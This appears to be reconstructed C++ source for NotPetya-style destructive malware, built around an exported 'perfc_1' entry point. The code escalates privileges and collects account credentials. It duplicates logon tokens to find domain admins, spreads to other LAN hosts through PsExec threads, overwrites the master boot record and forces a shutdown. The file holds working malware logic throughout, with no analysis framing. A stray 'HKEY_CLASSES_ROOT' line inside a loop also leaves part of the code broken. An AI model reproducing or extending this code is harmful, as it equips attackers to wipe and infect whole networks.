#include <Shlwapi.h>
#include <winternl.h>

#include "Global.h"
#include "ZVector.h"
#include "ZFile.h"
#include "ZPrivilege.h"
#include "ZPE.h"
#include "ZProcess.h"
#include "ZSystemCmd.h"
#include "ZMutex.h"
#include "ZMBR.h"
#include "ZNetwork.h"
#include "ZCollectAccount.h"
#include "ZInfect.h"
#include "ZString.h"

void Init()
{
	if (!g_nFreeSelfMark)
	{
		g_dwBeginTickCount = GetTickCount();
		DWORD dwPrivilege = 0;
		if (SetPrivilege(L"SeShutdownPrivilege"))
		{
			g_btCurPrivilege |= 1;
		}
		if (SetPrivilege(L"SeDebugPrivilege"))
		{
			g_btCurPrivilege |= 2;
		}
		if (SetPrivilege(L"SeTcbPrivilege"))
		{
			g_btCurPrivilege |= 4;
		}

		g_dwFindProcess = FindProcess();
		if (GetModuleFileNameW(g_hModule, g_pszFileName, 780))
		{
			ReadSelfData();
		}
	}
}

BOOL LoopPsexecInfected(CZVector *pVector, WCHAR *lpIp)
{
	BOOL bRet = FALSE;
	StringInfo *pStrInfo = NULL;
	CZVector::iterator *it = pVector->GetString(3, &pStrInfo);
	if (NULL != it)
	{
		do
		{
			HKEY_CLASSES_ROOT
			DWORD dwWNetRet = 0;
			bRet = PsexecInfected(lpIp, pStrInfo->m_pAryStrs[0], pStrInfo->m_pAryStrs[1], &dwWNetRet);
			if (ERROR_NO_NET_OR_BAD_PATH == dwWNetRet
				|| ERROR_NO_NETWORK == dwWNetRet
				|| ERROR_BAD_NETPATH == dwWNetRet
				|| ERROR_NETNAME_DELETED == dwWNetRet
				|| ERROR_BAD_NET_NAME == dwWNetRet
				|| !bRet)
			{
				break;
			}
		} while (pVector->GetString(it, &pStrInfo));

		delete it;
	}
	return bRet;
}

DWORD __stdcall LoopPsexecInfectedProc(LPVOID pParam)
{
	if (NULL != pParam)
	{
		if (NULL != g_pObj2
			&& (LoopPsexecInfected(g_pObj2, (WCHAR*)((DWORD*)pParam)[1])))
		{
			g_pObj1->SetInfected(NULL, (WCHAR*)((DWORD*)pParam)[1]);
		}
		else if (NULL != g_pAryString
			&& PsexecInfectByIp(((DWORD*)pParam)[1], g_pAryString))
		{
			g_pObj1->SetInfected(NULL, (WCHAR*)((DWORD*)pParam)[1]);
		}
		else if (0 != ((DWORD*)pParam)[0]
			&& PsexecInfected((WCHAR*)((DWORD*)pParam)[1], NULL, NULL, NULL))
		{
			g_pObj1->SetInfected(NULL, (WCHAR*)((DWORD*)pParam)[1]);
		}
	}

	delete[](char*)((DWORD*)pParam)[1];
	delete[](DWORD*)pParam;
	return 0;
}

DWORD __stdcall MultiThreadInfectProc(LPVOID pParam)
{
	if (g_btCurPrivilege & 4)
	{
		PsexecInfectLAN(NULL);
	}

	HANDLE aryThreads[4];

	DWORD *pAryParam = new DWORD[2];
	WCHAR *pszBuf = (WCHAR*)new char[33];
	pAryParam[0] = 0;
	pAryParam[1] = (DWORD)pszBuf;
	CZVector::iterator *it = g_pObj1->GetString(pszBuf);
	if (NULL != it)
	{
		int i = 0;
		do
		{
			DWORD dwMilliseconds = 0;
			int nCount = 0;
			if (4 != i)
			{
				HANDLE hThread = CreateThread(NULL, NULL, LoopPsexecInfectedProc, pAryParam, NULL, NULL);
				if (NULL == hThread)
				{
					break;
				}

				aryThreads[i] = hThread;
			}
			else
			{
				dwMilliseconds = INFINITE;
			}

			for (int j = 0; j < 4; j++)
			{
				if (NULL != aryThreads[j])
				{
					nCount++;
				}
			}

			DWORD dwWait = WaitForMultipleObjects(nCount, aryThreads, FALSE, dwMilliseconds);
			if (WAIT_FAILED == dwWait)
			{
				break;
			}
			else if (WAIT_TIMEOUT == dwWait)
			{
				for (int j = 0; j < 4; j++)
				{
					if (NULL == aryThreads[j])
					{
						i = j;
						break;
					}
				}
			}
			else if (dwWait < nCount)
			{
				CloseHandle(aryThreads[dwWait]);
				aryThreads[dwWait] = NULL;
			}

			pAryParam = new DWORD[2];
			pszBuf = (WCHAR*)new char[33]; pAryParam[0] = 0;
			pAryParam[1] = (DWORD)pszBuf;
		} while (g_pObj1->GetString(it, pszBuf));
		delete it;
	}
	return 0;
}

DWORD CheckGroupIsAdminis()
{
	BOOL bRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | 0x20000, TRUE, &hToken))
	{
		DWORD dwReturned = 0;
		if (!GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwReturned))
		{
			if (ERROR_INSUFFICIENT_BUFFER == GetLastError())
			{
				LPVOID pBuffer = GlobalAlloc(LMEM_ZEROINIT, dwReturned);
				if (NULL != pBuffer)
				{
					if (GetTokenInformation(hToken, TokenGroups, pBuffer, dwReturned, &dwReturned))
					{
						TOKEN_GROUPS *pTokenGroups = (TOKEN_GROUPS*)pBuffer;
						for (int i = 0; i < pTokenGroups->GroupCount; i++)
						{
							PUCHAR pCount = GetSidSubAuthorityCount(pTokenGroups->Groups[i].Sid);
							if (pCount)
							{
								if (*pCount >= 4)
								{
									PDWORD pIntegrityLevel = GetSidSubAuthority(pTokenGroups->Groups[i].Sid, 4);
									if (NULL != pIntegrityLevel)
									{
										if (DOMAIN_GROUP_RID_ADMINS == *pIntegrityLevel
											|| DOMAIN_GROUP_RID_ENTERPRISE_ADMINS == *pIntegrityLevel)
										{
											bRet = TRUE;
										}
									}
								}
							}
						}
					}
					GlobalFree(pBuffer);
				}
			}
		}
		CloseHandle(hToken);
	}
	return bRet;
}

DWORD __stdcall CheckGroupIsAdminisProc(LPVOID pParam)
{
	DWORD dwAuthorityLevel = CheckGroupIsAdminis();
	if (pParam)
	{
		*(DWORD*)pParam = dwAuthorityLevel;
	}
	return 0;
}

int __cdecl perfc_1(int arg0, DWORD dwErrCode, WCHAR* pCommandLine, HANDLE hThread)
{
	Init();
	if (INVALID_HANDLE_VALUE != hThread)
	{
		DeleteSelfReEntry(arg0, dwErrCode, pCommandLine);
	}

	WSAStartup(MAKEWORD(2, 2), &g_wsaData);

	g_pObj1 = new CZVector(0x24, x_StrCmpIW, NULL, 65535);
	g_pObj2 = new CZVector(0x8, x_StrCmpIW_Arrary, x_HeapFree_Array, 255);

	InitializeCriticalSection(&g_csCriticalSection);

	InitCmdLine(pCommandLine);

	if (g_btCurPrivilege & 2)
	{
		CheckMutileRun();
		OverlayMBR();
	}

	Shutdown();

	CloseHandle(CreateThread(NULL, NULL, CollectAllIPProc, NULL, 0, NULL));
	if ((g_btCurPrivilege & 2)
		&& (g_dwFindProcess & 1))
	{
		CollectAccounts();
	}

	g_pObj2->SetCollectComplete();
	if (g_dwFindProcess & 2)
	{
		ExtractDllHost_dat(g_btCurPrivilege & 6);
	}

	DWORD aryOldSessionID[64] = { 0 };
	if (g_btCurPrivilege & 4)
	{
		g_pAryString = new CZVector(4, x_strcmp, NULL, 255);
		DWORD dwSessionCount = DuplicateAllToken(aryOldSessionID);
		for (int i = 0; i < dwSessionCount; i++)
		{
			DWORD hToken = aryOldSessionID[i];
			DWORD dwErrCode = 0;
			HANDLE hThreadTemp = CreateThread(NULL, NULL, PsexecInfectLAN, NULL, CREATE_SUSPENDED, NULL);
			if (NULL != hThreadTemp)
			{
				if (SetThreadToken(&hThreadTemp, (HANDLE)hToken))
				{
					if (ResumeThread(hThreadTemp) == -1)
					{
						CloseHandle(hThreadTemp);
					}
				}
			}
			else
			{
				dwErrCode = ERROR_INVALID_PARAMETER;
			}
			SetLastError(dwErrCode);
			hThreadTemp = NULL;
			BOOL bIsAdmini = FALSE;
			hThreadTemp = CreateThread(NULL, NULL, CheckGroupIsAdminisProc, &bIsAdmini, CREATE_SUSPENDED, NULL);
			if (NULL != hThreadTemp)
			{
				if (SetThreadToken(&hThreadTemp, (HANDLE)hToken))
				{
					if (-1 != ResumeThread(hThreadTemp))
					{
						WaitForSingleObject(hThreadTemp, INFINITE);
					}
				}
				CloseHandle(hThreadTemp);
			}
			if (FALSE != bIsAdmini)
			{
				g_pAryString->AddData((WCHAR**)aryOldSessionID + i, 0);
			}
		}
	}
	g_pAryString->SetCollectComplete();
	return 0;
}

BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
	)
{
	if (DLL_PROCESS_ATTACH == fdwReason)
	{
		g_hModule = hinstDLL;
	}

	return TRUE;
}